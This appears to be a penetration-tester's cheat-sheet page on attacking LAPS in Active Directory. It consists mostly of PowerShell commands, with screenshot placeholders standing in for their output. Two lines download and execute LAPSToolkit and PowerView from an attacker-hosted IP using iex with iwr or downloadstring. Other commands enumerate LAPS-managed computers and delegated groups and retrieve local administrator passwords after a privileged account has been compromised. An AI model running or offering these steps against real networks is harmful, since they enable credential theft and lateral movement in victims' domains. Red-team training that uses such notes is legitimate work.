# LAPS

## LAPS

### LAPSToolKit Usage

```csharp
iex(iwr http://10.110.0.66:8001/LAPSToolkit.ps1) 
```

### Locate computers

```csharp
Get-LAPSComputers
```

![](<../../../../.gitbook/assets/image (148).png>)

### Find Delegate groups

```csharp
Find-LAPSDelegatedGroups
```

![](<../../../../.gitbook/assets/image (281).png>)

### Enumerate groups

#### Load powerview

```csharp
 iex(new-object net.webclient).downloadstring('http://10.110.0.66:8000/powerview.ps1')
```

```csharp
Get-NetGroupMember -GroupName <GROUP_NAME>
```

![](<../../../../.gitbook/assets/image (25) (1).png>)

### Retrieve password

{% hint style="info" %}
Require to compromise a privilege user
{% endhint %}

```csharp
Get-LAPSComputers
```

![](<../../../../.gitbook/assets/image (249) (1).png>)

### Resources

{% embed url="https://github.com/leoloobeek/LAPSToolkit" %}
